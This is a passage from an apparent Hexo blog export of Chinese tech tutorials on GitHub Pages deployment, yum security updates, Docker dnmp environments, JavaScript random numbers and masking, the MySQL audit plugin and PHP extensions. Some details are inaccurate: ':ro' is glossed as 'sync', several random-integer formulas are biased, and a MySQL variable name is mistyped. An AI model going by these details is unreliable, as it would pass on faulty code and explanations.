<h2 id="部署至GitHub-Pages"><a href="#部署至GitHub-Pages" class="headerlink" title="部署至GitHub Pages"></a>部署至GitHub Pages</h2><h3 id="注册GitHub"><a href="#注册GitHub" class="headerlink" title="注册GitHub"></a>注册GitHub</h3><p>注册 <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>，取一个亮一点的用户名，部署博客时会使用</p>
<h3 id="新建一个项目"><a href="#新建一个项目" class="headerlink" title="新建一个项目"></a>新建一个项目</h3><ol>
<li>点击“+” -&gt; 点击“New repository”  </li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618102800_6e70496168c02f4cc3a612ff92747931.jpeg" alt="image"></p>
<ol start="2">
<li>在 Repository name 中填写内容，格式为：<code>[你注册GitHub时填写的用户名].github.io</code></li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618102800_0e5bf87b35b4697f80f76fad1b5a1c32.jpeg" alt="image"></p>
<ol start="3">
<li>点击 <code>Create repository</code> 即可</li>
</ol>
<ol start="4">
<li><p>添加SSH key秘钥至GitHub，请参考 <a href="https://www.jianshu.com/p/5cd341bddae6" target="_blank" rel="noopener">此文章</a></p>
</li>
<li><p>修改配置文件</p>
</li>
</ol>
<p>找到项目文件夹下 <code>_config.yml</code> 打开后滑到最后，修改成下面的样子</p>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618102800_fc0a4b011fce40f06461b5e14aa05cb0.jpeg" alt="image"></p>
<ol start="6">
<li>推送项目至GitHub</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<blockquote>
<p>执行 <code>hexo d</code> 后报错：无法连接git或找不到git，执行命令安装 <code>hexo-deployer-git</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>安装完成后，再次执行 <code>hexo g</code> 和 <code>hexo d</code> 命令</p>
<ol start="7">
<li>去GitHub查看项目是否推送成功，成功如下图</li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618102801_fbc4e7ee83371167b1e776201a8d015e.jpeg" alt="image"></p>
<ol start="8">
<li>成功之后直接访问网址，网址格式： <code>[你注册GitHub时填写的用户名].github.io</code> ，成功后如下图</li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618102801_033f2f5c757642e52e777add317b6a41.jpeg" alt="image"></p>
<h3 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h3><ol>
<li>去域名服务商购买域名</li>
</ol>
<ol start="2">
<li>查看GitHub的IP地址，<a href="https://help.github.com/en/articles/setting-up-an-apex-domain#configuring-an-alias-or-aname-record-with-your-dns-provider" target="_blank" rel="noopener">参考文章</a>，或者可以直接解析到 <code>[你注册GitHub时填写的用户名].github.io</code></li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618110252_8113af1206a45cb836aca2822145c740.jpeg" alt="image"></p>
<ol start="3">
<li>解析域名</li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618145016_231d85b2315fdd093f78d12358fe8678.jpeg" alt="image"></p>
<ol start="4">
<li>点击 <code>Settings</code></li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618110252_00416d146896d5ed7e885e9cc53215e7.jpeg" alt="image"></p>
<ol start="5">
<li>找到GitHub Pages，填写域名，勾选强制https</li>
</ol>
<p><img src="http://image.nsxsg.com/uploads/20190618/20190618145320_ebb1bf7756e20487692c43b642a33982.jpeg" alt="image"></p>
<ol start="6">
<li>去浏览器查看是否成功（如果不成功，请等待，ssl证书申请需要时间，而且你在勾选强制https时，会有提示）</li>
<li>成功之后，需要进入<strong>Hexo的项目目录</strong>，在 <code>source</code> 目录下新建一个 <code>CNAME</code> 文件，内容为你的域名即可</li>
</ol>
<h2 id="部署至Coding-Pages"><a href="#部署至Coding-Pages" class="headerlink" title="部署至Coding Pages"></a>部署至Coding Pages</h2><h3 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h3><p>请去 <a href="https://coding.net" target="_blank" rel="noopener">Coding</a> 注册账号，中文界面往下撸就完事了。</p>
<h3 id="新建一个项目-1"><a href="#新建一个项目-1" class="headerlink" title="新建一个项目"></a>新建一个项目</h3><ol>
<li>绑定SSH公钥</li>
</ol>
<p>绑定SSH公钥，和GitHub类似</p>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618140747_bc941f36cb221db0577db0ea3a8e1347.png" alt="image"></p>
<ol start="2">
<li>新建项目</li>
</ol>
<p>添加一个和用户名相同的项目名称，和GitHub类似</p>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618140747_bb422649011e5b85fdf837b9224f1c5d.jpeg" alt="image"></p>
<ol start="3">
<li>修改配置文件</li>
</ol>
<p>把项目的SSH地址填写到Hexo的配置文件中，如下图</p>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618140747_5cdb7ae23662c0df752a30a4f0715b3a.jpeg" alt="image"></p>
<ol start="4">
<li>推送项目至Coding</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<blockquote>
<p>碰到问题，处理方式与GitHub类似</p>
</blockquote>
<ol start="5">
<li>开启Pages服务</li>
</ol>
<p>点击“Pages服务”之后，根据提示开启，成功后如下图，访问地址成功即可。</p>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618140747_5e9e10b8fcb2da0d06cf3b525bbde537.jpeg" alt="image"></p>
<h3 id="自定义域名-1"><a href="#自定义域名-1" class="headerlink" title="自定义域名"></a>自定义域名</h3><ol>
<li>点击设置</li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618140801_3465ec5647a9b31f5b4fb7eda7a24de6.jpeg" alt="image"></p>
<ol start="2">
<li>根据Coding绑定新域名方法，去域名服务商解析域名至Coding</li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618140801_756623e93860a1596ba6bd7228cee2aa.jpeg" alt="image"></p>
<ol start="3">
<li>绑定新域名，勾选首选，开启强制https访问，访问域名成功即可</li>
</ol>
<p><img src="http://cdn.nsxsg.com/uploads/20190618/20190618140801_06521d2383ef7b8c15d180daa9621b17.jpeg" alt="image"></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Hexo</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux软件漏洞修复</title>
    <url>/2019/09/26/30.html</url>
    <content><![CDATA[<p>阿里云安全中心提示待处理漏洞，通过搜集资料笔者对漏洞进行了相应的处理，并通过了阿里云的验证。</p>
<a id="more"></a>
<h2 id="libssh2-安全更新"><a href="#libssh2-安全更新" class="headerlink" title="libssh2 安全更新"></a>libssh2 安全更新</h2><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
<li>查看yum源设置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ll &#x2F;etc&#x2F;yum.repos.d&#x2F;</span><br></pre></td></tr></table></figure></li>
<li>安装更新<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y libssh2</span><br><span class="line">或者</span><br><span class="line">yum update -y libssh2</span><br></pre></td></tr></table></figure></li>
<li>复查<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -qa libssh2</span><br></pre></td></tr></table></figure></li>
<li>去阿里云安全中心验证，通过即可</li>
</ol>
<hr>
<p>参考文章：<a href="https://forum.bclinux.org/topic/955/blsa-2019-0038-%E9%87%8D%E8%A6%81-libssh2-%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%AC%E5%91%8A" target="_blank" rel="noopener">https://forum.bclinux.org/topic/955/blsa-2019-0038-%E9%87%8D%E8%A6%81-libssh2-%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%AC%E5%91%8A</a></p>
<h2 id="curl-安全和BUG修复更新"><a href="#curl-安全和BUG修复更新" class="headerlink" title="curl 安全和BUG修复更新"></a>curl 安全和BUG修复更新</h2><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
<li>查看yum源设置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ll &#x2F;etc&#x2F;yum.repos.d&#x2F;</span><br></pre></td></tr></table></figure></li>
<li>安装更新<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y libcurl-devel</span><br><span class="line">yum install -y libcurl</span><br><span class="line">yum install -y curl</span><br><span class="line">或者</span><br><span class="line">yum update -y libcurl-devel</span><br><span class="line">yum update -y libcurl</span><br><span class="line">yum update -y curl</span><br></pre></td></tr></table></figure></li>
<li>去阿里云安全中心验证，通过即可</li>
</ol>
<hr>
<p>参考文章：<a href="https://www.xuexiareas.com/index/Articles/details/num/315.html" target="_blank" rel="noopener">https://www.xuexiareas.com/index/Articles/details/num/315.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>安全防护</tag>
        <tag>Linux软件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10下dnmp环境搭建</title>
    <url>/2019/11/25/31.html</url>
    <content><![CDATA[<p>本文是对Windows10系统下搭建dnmp环境的步骤做一次记录，顺便对搭建过程中遇到的问题进行相应的说明。</p>
<a id="more"></a>
<h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><ol>
<li>去<a href="https://hub.docker.com/_/mysql?tab=tags" target="_blank" rel="noopener">仓库</a>找到相应的镜像</li>
<li>在命令行中输入以下命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 拉取镜像</span><br><span class="line">docker pull mysql:5.7</span><br><span class="line">&#x2F;&#x2F; 启动容器</span><br><span class="line">docker run -p 3306:3306 --name mysql5.7 -d -v D:\dnmp\mysql:&#x2F;var&#x2F;lib&#x2F;mysql -e MYSQL_ROOT_PASSWORD&#x3D;123456 mysql:5.7</span><br><span class="line"></span><br><span class="line">注释：   </span><br><span class="line">--name mysql5.7 -- 容器名称  </span><br><span class="line">D:\dnmp\mysql:&#x2F;var&#x2F;lib&#x2F;mysql -- 冒号前面是本地路径，冒号后面是容器中的路径【默认不动】</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>进入容器</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it mysql5.7 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><ol>
<li>去<a href="https://hub.docker.com/_/php?tab=tags" target="_blank" rel="noopener">仓库</a>找到相应的镜像</li>
<li>在命令行中输入以下命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 拉取镜像</span><br><span class="line">docker pull php:7.2-fpm</span><br><span class="line">&#x2F;&#x2F; 启动容器</span><br><span class="line">docker run --name  php-fpm7.2 -p 9000:9000 -v D:\dnmp\www:&#x2F;www -d php:7.2-fpm</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">D:\dnmp\www:&#x2F;www -- 冒号前面是本地路径（项目目录），冒号后面是容器中的路径【默认不动】</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>进入容器安装PDO扩展</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it php-fpm7.2 &#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;bin&#x2F;</span><br><span class="line">docker-php-ext-install pdo pdo_mysql</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> php要连接docker中运行的mysql是不能用localhost,127.0.0.1来连接的，因为每个docker运行容器的localhost、127.0.0.1都是自己容器本身，不是mysql容器，需要修改成母机 IP，或者是mysql容器名称。php中连接的 mysql host填写mysql 不用 localhost 或127.0.0.1</p>
<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><ol>
<li>去<a href="https://hub.docker.com/_/nginx?tab=tags" target="_blank" rel="noopener">仓库</a>找到相应的镜像  </li>
<li>在命令行输入以下命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 拉取镜像</span><br><span class="line">docker pull nginx:latest</span><br><span class="line">&#x2F;&#x2F; 启动容器</span><br><span class="line">docker run --name nginx -p 80:80 -v D:\dnmp\www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html:ro -v  D:\dnmp\nginx\conf\conf.d:&#x2F;etc&#x2F;nginx&#x2F;conf.d:ro -d nginx</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">D:\dnmp\www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html:ro -- 本地项目路径：容器项目路径：ro 【此处是映射关系，照样修改即可，ro指同步】</span><br><span class="line">D:\dnmp\nginx\conf\conf.d:&#x2F;etc&#x2F;nginx&#x2F;conf.d:ro -- 本地项目路径：容器项目路径：ro 【此处是映射关系，照样修改即可，ro指同步】</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>Nginx配置文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  jingyi.com;</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        &#x2F;&#x2F; 项目根目录，注意目录结构</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;public;</span><br><span class="line">        index  index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">        if (!-e $request_filename) &#123;</span><br><span class="line">            rewrite  ^(.*)$  &#x2F;index.php?s&#x3D;&#x2F;$1  last;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">    location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">        &#x2F;&#x2F; 项目根目录，注意目录结构</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;public;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        fastcgi_pass   php:9000;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        &#x2F;&#x2F; 项目根目录，注意目录结构</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  &#x2F;www&#x2F;public&#x2F;$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>dnmp环境</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript生成随机数</title>
    <url>/2017/09/17/3.html</url>
    <content><![CDATA[<p>随机数在Web开发中的运用还是十分广泛的，比如：验证码的生成、密码的生成、抽奖系统等。</p>
<a id="more"></a>
<ul>
<li><p>预备知识 <code>Math.random()</code> 函数返回0和1之间的伪随机数，可能为0，但总是小于1。</p>
</li>
<li><p>生成 <code>n-m</code> ，包含 <code>n</code> 但不包含 <code>m</code> 的整数</p>
<ol>
<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code> </li>
<li>第二步：<code>Math.random()*w</code> </li>
<li>第三步：<code>Math.random()*w+n</code> </li>
<li>第四步：<code>parseInt(Math.random()*w+n,10)</code></li>
</ol>
</li>
<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 但包含 <code>m</code> 的整数</p>
<ol>
<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
<li>第二步：<code>Math.random()*w</code></li>
<li>第三步：<code>Math.random()*w+n</code></li>
<li>第四步：<code>Math.floor(Math.random()*w+n)+1</code></li>
</ol>
</li>
<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 和 <code>m</code> 的整数</p>
<ol>
<li>第一步：算出 <code>m-n-2</code> 的值，假设等于 <code>w</code></li>
<li>第二步：<code>Math.random()*w</code></li>
<li>第三步：<code>Math.random()*w+n+1</code></li>
<li>第四步：<code>Math.round(Math.random()*w+n+1)</code> 或者 <code>Math.ceil(Math.random()*w+n+1)</code></li>
</ol>
</li>
<li><p>生成 <code>n-m</code>，包含 <code>n</code> 和 <code>m</code> 的整数</p>
<ol>
<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
<li>第二步：<code>Math.random()*w</code></li>
<li>第三步：<code>Math.random()*w+n</code></li>
<li>第四步：<code>Math.round(Math.random()*w+n)</code> 或者 <code>Math.ceil(Math.random()*w+n)</code></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>使用JS实现银行卡卡号和手机号的中间数字以星号表示</title>
    <url>/2017/09/27/4.html</url>
    <content><![CDATA[<p>在WAP开发过程中，肯定遇到过银行卡卡号和手机号的中间数字是星号的情况。下面来介绍一下如何使用原生JS实现这个功能。</p>
<a id="more"></a>
<p>废话不多说直接贴出银行卡卡号的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"2222333344445555"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;4&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** **** $2"</span>);</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<blockquote>
<p>2222 <strong>** **</strong> 5555</p>
</blockquote>
<p>下面是手机号的代码（其实只要照着银行卡的代码略作修改就可以了）：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"13812344321"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;3&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** $2"</span>);</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<blockquote>
<p>138 **** 4321</p>
</blockquote>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Dockerfile+Compose搭建dnmp开发环境</title>
    <url>/2019/11/27/32.html</url>
    <content><![CDATA[<p>本文是对Windows10系统下使用Dockerfile+Compose搭建dnmp开发环境的步骤做一次记录，顺便对搭建过程中遇到的问题进行相应的说明。</p>
<a id="more"></a>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ol>
<li>Dockerfile： <code>一个用来构建镜像的文本文件</code></li>
<li>Compose： <code>用于定义和运行多容器 Docker 应用程序的工具</code></li>
</ol>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dnmp[脚本项目名称目录]</span><br><span class="line">    |-- Dockerfile [存放Dockerfile文件的目录]</span><br><span class="line">        |-- Dockerfile-php [php镜像的Dockerfile文件]</span><br><span class="line">        ...</span><br><span class="line">    |-- docker-compose.yml [compose文件]</span><br></pre></td></tr></table></figure>

<p><strong>注：如果PHP、MySQL、NGINX的相应数据需要存在本地，那么其目录，根据实际情况创建。并在docker-compose.yml文件中的 <code>volumes</code> 配置项中体现。</strong></p>
<h3 id="脚本内容"><a href="#脚本内容" class="headerlink" title="脚本内容"></a>脚本内容</h3><ol>
<li>Dockerfile-php</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM php:7.2-fpm</span><br><span class="line">RUN &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-php-ext-install pdo pdo_mysql</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>docker-compose.yml</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># lnmp 配置</span><br><span class="line">version: &#39;3&#39;</span><br><span class="line">services:</span><br><span class="line">  php:</span><br><span class="line">    build:</span><br><span class="line">      context: .&#x2F;Dockerfile</span><br><span class="line">      dockerfile: Dockerfile-php</span><br><span class="line">    container_name: &quot;php-fpm7.2&quot;</span><br><span class="line">    expose:</span><br><span class="line">      - &quot;9000&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;D:\\dnmp\\www:&#x2F;www&quot;</span><br><span class="line">  nginx:</span><br><span class="line">    image: &quot;nginx:latest&quot;</span><br><span class="line">    container_name: &quot;nginx&quot;</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:80&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;D:\\dnmp\\www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&quot;</span><br><span class="line">      - &quot;D:\\dnmp\\nginx\\conf\\conf.d:&#x2F;etc&#x2F;nginx&#x2F;conf.d&quot;</span><br><span class="line">  mysql:</span><br><span class="line">    image: &quot;mysql:5.7&quot;</span><br><span class="line">    container_name: &quot;mysql5.7&quot;</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: 123456</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;3306:3306&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;D:\\dnmp\\mysql:&#x2F;var&#x2F;lib&#x2F;mysql&quot;</span><br></pre></td></tr></table></figure>

<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>在脚本目录中运行命令： <code>docker-compose up</code><br>后台执行该服务可以加上 <code>-d</code> 参数： <code>docker-compose up -d</code></p>
<h2 id="Docker-compose命令"><a href="#Docker-compose命令" class="headerlink" title="Docker-compose命令"></a>Docker-compose命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>docker-compose up -d</td>
<td>后台创建并运行容器</td>
</tr>
<tr>
<td>docker-compose start</td>
<td>开始服务</td>
</tr>
<tr>
<td>docker-compose stop</td>
<td>停止服务</td>
</tr>
<tr>
<td>docker-compose restart</td>
<td>重启服务</td>
</tr>
<tr>
<td>docker-compose pause nginx</td>
<td>暂停nginx容器</td>
</tr>
<tr>
<td>docker-compose unpause nginx</td>
<td>恢复nginx容器</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>dnmp环境</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10下Docker无法共享磁盘卷</title>
    <url>/2019/11/28/33.html</url>
    <content><![CDATA[<p>使用Docker-Compose启动时，无法共享本地磁盘卷，并且在 <code>Settings -&gt; Shared Drives</code> 中重新设置并单击 <code>Apply</code> 后，仍然失败无法应用。</p>
<a id="more"></a>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
<li>查看docker日志，日志位置为： <code>C:\Users\[本机用户名]\AppData\Local\Docker</code> 。查看是否有权限问题，<em>基本不显示</em> 。</li>
<li>修改策略组权限： <code>运行 -&gt; gpedit.msc -&gt; 计算机配置 -&gt; Windows设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 安全选项 -&gt; 网络访问：本地账户的共享和安全模式</code> 打开，设置为 <code>经典</code> 。</li>
<li>保存后重新设置docker的共享文件。</li>
</ol>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>磁盘共享</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql开启安全审计（audit审计插件）</title>
    <url>/2017/09/28/6.html</url>
    <content><![CDATA[<p>为了安全和操作的可追溯性考虑，越来越多的公司加入了审计功能。MySql5.5推出了相关的审计功能，到5.6.20功能进一步完善。下面来介绍一下如何开启MySql的audit审计功能。</p>
<a id="more"></a>
<ol>
<li>查看MySql插件目录，即plugin目录</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global variables like &#39;plugin_fir&#39;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>下载二进制包：<a href="https://bintray.com/mcafee/mysql-audit-plugin/release" target="_blank" rel="noopener">https://bintray.com/mcafee/mysql-audit-plugin/release</a>包含了5.1，5.5，5.6对应的二进制包（如果在plugin目录下有 <code>libaudit_plugin.so</code> 文件，就不用下载了），复制下载的so文件至MySql插件目录</li>
<li>在线开启audit</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; INSTALL PLUGIN AUDIT SONAME &#39;libaudit_plugin.so&#39;;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>查看对应的版本</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global status like &#39;AUDIT_version&#39;;</span><br></pre></td></tr></table></figure>

<p><em>有结果即安装成功！</em>  <strong>查看audit的相关命令：</strong><br><code>mysql &gt; show global variables like &#39;%audit%&#39;;</code><br><strong>设置相关的参数：</strong><br><code>mysql &gt; set global (填写查询后的audit相关命令) = ......;</code></p>
<ol start="5">
<li>开启audit功能（关闭就把On改成Off）</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; set global audit_json_file&#x3D;On;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>执行Sql语句（对数据库数据有操作就行），看MySql数据目录的 <code>mysql-audit.json</code> 文件是否有变化 <code>（【MySql安装目录】/data/mysql-audit.json）</code></li>
</ol>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>audit审计插件</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos环境下PHP5.3开启curl_init扩展</title>
    <url>/2017/09/28/5.html</url>
    <content><![CDATA[<p>Centos环境下PHP5.3开启curl_init扩展，也可根据此方法开启其它的PHP扩展。</p>
<a id="more"></a>
<ol>
<li>进入到PHP源码包目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd 【PHP源码包目录】/ext/curl</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>运行phpize脚本</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/local/php/bin/phpize</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>编译安装模块</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --with-php-config=/usr/local/php/bin/php-config --with-curl=DIR</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><strong>看清楚出现的提示，就说明成功了。然后去他给出的路径 <code>/usr/local/php/lib/php/extensions/no-debug-non-zts-20100525/</code> 目录下看看是否有 <code>curl.so</code> 文件</strong></p>
<ol start="4">
<li>配置php.ini文件，再最后加上 <code>extension=curl.so</code> </li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 'extension=curl.so' &gt;&gt; /usr/local/php/php.ini</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>重启PHP</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/php-fpm restart</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>PHP5.3扩展</tag>
      </tags>
  </entry>
  <entry>
    <title>Deepin安装Aria2+AriaNg</title>
    <url>/2020/11/28/34.html</url>
    <content><![CDATA[<p>Aria2是Linux系统的下载神器，支持多种下载协议，还能离线下载。AriaNg是可视化操作的前端，用来执行相关的Aria2命令。</p>
<a id="more"></a>
<h2 id="安装Aria2"><a href="#安装Aria2" class="headerlink" title="安装Aria2"></a>安装Aria2</h2><ul>
<li><p>Deepin安装Aria2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install -y aria2</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="配置Aria2"><a href="#配置Aria2" class="headerlink" title="配置Aria2"></a>配置Aria2</h2><ol>
<li><p>创建配置文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;root&#x2F;.aria2</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建<code>aria2.session</code> 、 <code>aria2.log</code>和<code>aria2.conf</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch &#x2F;root&#x2F;.aria2&#x2F;aria2.session</span><br><span class="line">touch &#x2F;root&#x2F;.aria2&#x2F;aria2.log</span><br><span class="line">touch &#x2F;root&#x2F;.aria2&#x2F;aria2.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改<code>aria2.conf</code>文件</p>
